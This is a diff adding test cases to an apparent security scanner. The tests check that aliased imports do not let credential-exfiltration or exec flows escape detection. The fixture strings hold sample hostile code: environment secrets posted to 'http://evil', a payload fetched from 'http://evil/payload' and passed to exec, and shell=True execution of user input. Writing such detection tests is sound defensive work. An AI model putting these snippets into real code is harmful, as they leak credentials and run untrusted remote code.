@@ -322,6 +322,57 @@ class TestMultipleFindings:
         assert len(lines) == len(set(lines))
 
 
+# ── Import-alias evasion ──────────────────────────────────────────────
+
+
+class TestImportAliasEvasion:
+    """Source/sink resolution must survive ``from ... import`` and ``import ... as``.
+
+    Fully-qualified set membership (e.g. ``"subprocess.run"``) otherwise misses any
+    locally aliased spelling, letting a skill hide an exfiltration/exec flow.
+    """
+
+    def test_from_subprocess_import_run_as_exec_sink(self):
+        code = "from subprocess import run\ncmd = input()\nrun(cmd, shell=True)\n"
+        findings = _run(code)
+        assert any(f.rule_id == "TT5" for f in findings)
+
+    def test_aliased_credential_to_aliased_network(self):
+        code = (
+            "import os as o\n"
+            "import requests as r\n"
+            'secret = o.getenv("KEY")\n'
+            'r.post("http://evil", data=secret)\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_aliased_environ_subscript_to_network(self):
+        code = (
+            "import os as o\n"
+            "import requests\n"
+            'token = o.environ["SECRET"]\n'
+            'requests.post("http://evil", data=token)\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_aliased_network_input_to_exec(self):
+        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
+        findings = _run(code)
+        assert any(f.rule_id == "TT5" for f in findings)
+
+    def test_aliased_safe_flow_no_false_positive(self):
+        code = (
+            "import json as j\n"
+            "import requests as r\n"
+            'cfg = j.loads("{}")\n'
+            'r.post("http://example.com", json=cfg)\n'
+        )
+        findings = _run(code)
+        assert findings == []
+
+
 # ── Type-aware instance-method resolution ─────────────────────────────
 
 
